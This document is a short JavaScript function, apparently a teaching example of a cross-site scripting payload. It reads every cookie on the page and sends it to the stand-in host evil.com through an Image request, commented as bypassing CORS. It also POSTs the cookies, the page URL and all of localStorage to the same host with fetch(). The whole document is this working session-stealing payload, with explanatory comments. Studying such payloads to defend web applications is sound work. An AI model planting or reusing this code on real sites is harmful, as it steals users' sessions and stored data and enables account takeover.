function stealCookie() {  // 1. Read every cookie on this domain  const stolen = document.cookie;  // → 'session=abc123; csrf=xyz789'  // → '' if HttpOnly is set (nothing to steal)  // 2. Exfiltrate via Image — bypasses CORS entirely  new Image().src =    'https://evil.com/steal?c=' + encodeURIComponent(stolen);  // GET /steal?c=session%3Dabc123  (no CORS check on image requests)  // 3. Alternative: fetch() for larger payloads  fetch('https://evil.com/steal', {    method: 'POST',    body: JSON.stringify({      cookies:      stolen,      url:          location.href,      localStorage: JSON.stringify(localStorage),    })  });}
